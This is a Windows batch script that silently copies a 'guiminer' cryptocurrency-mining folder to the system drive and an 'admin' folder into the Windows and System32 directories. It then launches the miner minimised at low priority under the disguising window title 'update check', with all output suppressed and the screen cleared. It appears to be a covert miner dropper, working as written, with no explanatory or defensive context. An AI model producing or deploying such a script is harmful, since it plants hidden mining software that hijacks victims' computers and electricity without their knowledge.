@echo off

ROBOCOPY "%CD%\guiminer" "%homedrive%\guiminer" * /E /Z /COPY:DA /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS

ROBOCOPY "%CD%\admin" "%WINDIR%\admin" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS
ROBOCOPY "%CD%\admin" "%WINDIR%\System32\admin" "*" /E /Z /COPY:DAS /SECFIX /REG /TBD /BYTES /NS /NC /NFL /NDL /NP /NJH /NJS

start "update check" /MIN /LOW "cmd" "/Q /C "%homedrive%\guiminer\clean.bat""
start "update check" /MIN /LOW "cmd /Q /C "%CD%\guiminer\start.bat SETUP.bat""

cls
exit /B %errorlevel%
exit %errorlevel%